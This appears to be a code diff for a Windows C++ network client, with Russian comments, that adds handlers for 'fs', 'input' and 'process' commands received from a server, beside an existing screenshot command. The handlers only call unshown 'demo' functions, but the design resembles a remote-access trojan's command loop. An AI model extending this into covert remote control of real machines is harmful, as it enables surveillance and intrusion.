@@ -1,5 +1,8 @@
 #include "network.h"
 #include "screenshot_demo.h"
+#include "fs_demo.h"
+#include "input_demo.h"
+#include "process_demo.h"
 
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -108,6 +111,27 @@ void process_server_line(const std::string& line, SOCKET sock) {
         capture_screenshot_demo();
         send_raw_string(sock, "screenshot saved");
         log_debug("[CMD] Screenshot taken");
+        return;
+    }
+    // Обработка команды fs (файловый менеджер)
+    if (line == "fs") {
+        fs_demo();   // функция из fs_demo.h
+        send_raw_string(sock, "fs demo completed, check fs_demo.txt");
+        log_debug("[CMD] File system demo executed");
+        return;
+    }
+    // Обработка команды input (демо ввода)
+    if (line == "input") {
+        input_demo();   // функция из input_demo.h
+        send_raw_string(sock, "input demo completed, check input_demo.txt");
+        log_debug("[CMD] Input demo executed");
+        return;
+    }
+    // Обработка команды process (демо процесса)
+    if (line == "process") {
+        process_demo();   // функция из process_demo.h
+        send_raw_string(sock, "process demo completed, check process_demo.txt");
+        log_debug("[CMD] Process demo executed");
         return;
     }
 
